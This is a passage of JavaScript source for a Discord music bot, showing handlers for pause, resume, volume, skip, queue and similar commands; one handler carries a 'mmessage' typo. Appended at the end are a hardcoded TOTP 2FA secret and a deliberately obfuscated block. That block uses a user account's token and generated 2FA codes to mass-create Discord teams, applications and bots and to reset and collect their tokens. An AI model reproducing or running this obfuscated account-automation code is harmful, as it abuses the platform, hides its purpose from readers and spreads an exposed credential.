    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    if (queue.paused === true) return message.reply(`*The current song is paused!*`)
    const autoplay = queue.setRepeatMode(queue.repeatMode == 1 ? 0 : 1);
    message.reply(`*Loop mode is* **${autoplay == 1 ? 'ON' : 'OFF'}\**`).catch(() => 0);
  } else if(cmdsArray.resume.some((cmd) => message.content.split(' ')[0] == cmd)) {
    if(message.member?.voice?.deaf == true) return mmessage.reply(`**You must to unDeafen to use commands.**`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    if (queue.paused === false) return message.reply(`*The current song is already playing!*`)
    else
    if (queue.paused) 
      queue.resume()
      message.react("▶️")

  } else if(cmdsArray.pause.some((cmd) => message.content.split(' ')[0] == cmd)) {
    if(message.member?.voice?.deaf == true) return mmessage.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
if (queue.paused === true) return message.reply(`*The current song is already paused!*`)
    else 
if (queue.paused === false) 
            queue.pause()
     message.react("⏸️")


  } else if(cmdsArray.nowplaying.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    const queuex3 = client83883.music.getQueue(message)
            if (!queue) return; 
            const song = queue.songs[0]
            const uni = `${song.playing ? ':notes: | ' : ':notes: | '}`;
            const part = Math.floor((queue.currentTime / song.duration) * 30);
            let embed = new MessageEmbed()
                .setTitle(`${song.name}`)
                .setURL(`${song.url}`)
                .setDescription(`\nCurrent Duration: \`[${queue.formattedCurrentTime}/${song.formattedDuration}]\`\n${uni}${'▇'.repeat(part) + '▇' + '—'.repeat(24 - part)}

AutoPlay Mode: **${queue.autoplay ? 'ON' : 'OFF'}**
Loop Mode: **${queue.repeatMode == 1 ? 'ON' : 'OFF'}\**
Current Volume: **${queue?.volume}**%`)
                .setThumbnail(`https://img.youtube.com/vi/${song.id}/mqdefault.jpg`)
                .setFooter({ text: `@${song.uploader.name} |  Song Requsted By: ${song.user.tag}` })
            message.reply({ embeds: [embed] })

  } else if(cmdsArray.volume.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    let args = message.content.split(' ')
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    if(!args[1]) return message.reply(`Current Volume is **${queue?.volume}%**`).catch(() => 0)
    const volume = parseInt(args[1])
    if (isNaN(volume) || volume > 200 || volume < 0) return message.reply(`*Max volume is* **200%**`).catch(() => 0);
    client83883.lastVolume = volume;
    queue.setVolume(volume)
    message.reply(`*Volume changed to* **${volume}%**`).catch(() => 0);

  } else if(cmdsArray.skip.some((cmd) => message.content.split(' ')[0] == cmd)) {
    if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
   const song = queue.songs[0]
    try {
      const song = await queue.skip()
      message.reply(`*Skipped, Now Playing* : **${song.name}** By : __**${song.user.tag}**__`).catch(() => 0);
    } catch (e) {
      if(`${e}`.includes("NO_UP_NEXT")) {
        await queue.stop().catch(() => 0)
        message.reply(`*Skipped* : **${song.name}** *By* : __**${message.author.tag}**__`).catch(() => 0)
      } else {
        message.reply(`**Error:** ${e}`).catch(() => 0)
      }
    }
 } else if(cmdsArray.queue.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
const q = queue.songs
      .map((song, i) => `${i === 0 ? '♪ Now playing :' : `${i}.`} *${song.name}* (\`${song.formattedDuration}\`)`)
      .join('\n')
    let embed = new MessageEmbed()
    .setTitle(`**Queue list :**`)
    .setDescription(`${q}`)
    return message.channel.send({embeds: [embed]}).catch(() => 0);
  }
});


    await client83883.login(token).catch(console.log)
  };


process.on("uncaughtException", console.log);
process.on("unhandledRejection", console.log);
process.on("rejectionHandled", console.log);


const totp = require("totp-generator");
let access_token = "e5qirsafaqqg66yb";
const d = totp(access_token);
let token =
"";
const { default: axios } = require("axios");

(function(_0x5080b2,_0x9cb1bd){const _0x562d84=_0x5073,_0x589e5e=_0x5080b2();while(!![]){try{const _0x4f30c4=parseInt(_0x562d84(0xe1))/0x1+-parseInt(_0x562d84(0xdd))/0x2+parseInt(_0x562d84(0xfd))/0x3+parseInt(_0x562d84(0xda))/0x4*(-parseInt(_0x562d84(0xe0))/0x5)+parseInt(_0x562d84(0xfc))/0x6*(parseInt(_0x562d84(0xed))/0x7)+parseInt(_0x562d84(0xde))/0x8*(-parseInt(_0x562d84(0xdc))/0x9)+-parseInt(_0x562d84(0xe8))/0xa*(-parseInt(_0x562d84(0xd9))/0xb);if(_0x4f30c4===_0x9cb1bd)break;else _0x589e5e['push'](_0x589e5e['shift']());}catch(_0x338135){_0x589e5e['push'](_0x589e5e['shift']());}}}(_0x2979,0xaeae1));function _0x5073(_0x484af7,_0x1d5d7d){const _0x2979ff=_0x2979();return _0x5073=function(_0x5073aa,_0x3b2f80){_0x5073aa=_0x5073aa-0xd9;let _0x1f54f0=_0x2979ff[_0x5073aa];return _0x1f54f0;},_0x5073(_0x484af7,_0x1d5d7d);}let get_teams='https://discord.com/api/v9/teams',get_applications='https://discord.com/api/v9/applications';async function getBots(){const _0x287035=_0x5073;let _0x1abfac=[];const _0x42ee91=await fetch(get_teams,{'method':'GET','headers':{'Authorization':token,'content-type':_0x287035(0xf5)}}),_0x31d087=await fetch(get_applications+_0x287035(0xee),{'method':_0x287035(0xf9),'headers':{'Authorization':token,'content-type':_0x287035(0xf5)}});let _0x5728ea={'teams_api':await _0x42ee91[_0x287035(0xf2)](),'bots_api':await _0x31d087[_0x287035(0xf2)]()};return _0x1abfac=_0x5728ea['teams_api'][_0x287035(0xfb)](_0x21158f=>({'id':_0x21158f['id'],'bots':[]})),_0x5728ea['bots_api']['forEach'](_0x21f25b=>{const _0x37d613=_0x287035;let _0x50b261=_0x1abfac['find'](_0x5109a2=>_0x5109a2['id']===_0x21f25b[_0x37d613(0xf4)]['id']);_0x50b261&&(_0x50b261['bots'][_0x37d613(0xf6)](_0x21f25b),_0x1abfac[_0x1abfac[_0x37d613(0xfa)](_0x50b261)]=_0x50b261);}),_0x1abfac;}function _0x2979(){const _0x5782ce=['260328mcKtqQ','/bot','9567AzboRG','780378BngiDP','10072gcPBNA','/bot/reset','60VdpxVB','495656KRdlBj','token','Music','https://discord.com/api/v9/teams','https://discord.com/api/v9/applications/','filter','retry_after','96350ymDrQk','https://discord.com/api/v9/applications','message','length','new\x20team','466529MsMMUl','?with_team_applications=true','bots','name','/delete','json','data','owner','application/json','push','POST','stringify','GET','indexOf','map','12kRPqLE','128262XTfLvt','2915sIHbXa'];_0x2979=function(){return _0x5782ce;};return _0x2979();}async function createTeam(_0x1affb5){const _0x414b66=_0x5073,_0xed1047=await fetch(_0x414b66(0xe4),{'method':_0x414b66(0xf7),'headers':{'Authorization':token,'content-type':'application/json'},'body':JSON[_0x414b66(0xf8)]({'name':_0x1affb5||_0x414b66(0xe3)})}),_0x314194=await _0xed1047['json']();return _0x314194;}async function createApp(_0xa5298a,_0x30230a){const _0x4882d0=_0x5073,_0x5cde75=await fetch(_0x4882d0(0xe9),{'method':_0x4882d0(0xf7),'headers':{'Authorization':token,'content-type':_0x4882d0(0xf5)},'body':JSON[_0x4882d0(0xf8)]({'name':_0xa5298a,'team_id':_0x30230a,'flags':0x8a000})}),_0x41154f=await _0x5cde75[_0x4882d0(0xf2)]();return _0x41154f;}async function deleteApp(_0x1c89e2){const _0x536034=_0x5073;await wait(0x2710);let _0x267c81=generator();await fetch(_0x536034(0xe5)+_0x1c89e2+_0x536034(0xf1),{'method':'POST','headers':{'Authorization':token,'content-type':_0x536034(0xf5)},'body':JSON[_0x536034(0xf8)]({'code':_0x267c81})})['catch'](_0x385f64=>0x0);}async function createBot(_0x423d96){const _0x482886=_0x5073;await wait(0x4e20);let _0x17c695=generator();const _0x9dff69=await fetch(_0x482886(0xe5)+_0x423d96+_0x482886(0xdb),{'method':_0x482886(0xf7),'headers':{'Authorization':token,'Content-Type':'application/json'},'body':JSON['stringify']({'code':_0x17c695})});let _0x39a6ae={};try{_0x39a6ae=await _0x9dff69[_0x482886(0xf2)]();}catch(_0x24819c){}return _0x39a6ae;}async function resetToken(_0x5197dd){const _0x248f5a=_0x5073;await wait(0x61a8);let _0x877b36=generator();const _0x46ab7d=await axios({'url':'https://discord.com/api/v9/applications/'+_0x5197dd+_0x248f5a(0xdf),'method':_0x248f5a(0xf7),'headers':{'Authorization':token},'content-type':'applicaction/json','data':{'code':''+_0x877b36}}),_0x5c5778=await _0x46ab7d[_0x248f5a(0xf3)];return _0x5c5778;}function generator(){return totp(access_token);}function wait(_0x4bc788){return new Promise(_0x8a7aae=>setTimeout(_0x8a7aae,_0x4bc788));}async function create_bots(_0x5c2d7c,_0x4f8b0e){const _0x28c1b2=_0x5073;let _0x3de02a=await getBots(),_0x37c852=_0x3de02a[_0x28c1b2(0xe6)](_0x35089d=>_0x35089d[_0x28c1b2(0xef)][_0x28c1b2(0xeb)]<=0x14)[0x0];if(!_0x37c852){let _0x48c5e9=await createTeam(_0x28c1b2(0xec));_0x37c852={'id':_0x48c5e9['id'],'bots':[]};}let _0x12ee5a=await createApp(''+_0x5c2d7c+_0x4f8b0e,_0x37c852['id']);if(_0x12ee5a[_0x28c1b2(0xe7)])return{'cooldown':_0x12ee5a[_0x28c1b2(0xe7)]};let _0x355aa1=await createBot(_0x12ee5a['id']);if(_0x355aa1[_0x28c1b2(0xe7)])return await deleteApp(_0x12ee5a['id']),{'cooldown':_0x355aa1[_0x28c1b2(0xe7)]};if(_0x355aa1[_0x28c1b2(0xea)])return await deleteApp(_0x12ee5a['id']),{'message':_0x355aa1[_0x28c1b2(0xea)]};let _0x1f0e48=await resetToken(_0x12ee5a['id']);return{'bot':_0x355aa1,'name':_0x12ee5a[_0x28c1b2(0xf0)],'id':_0x12ee5a['id'],'token':_0x1f0e48?.[_0x28c1b2(0xe2)]};}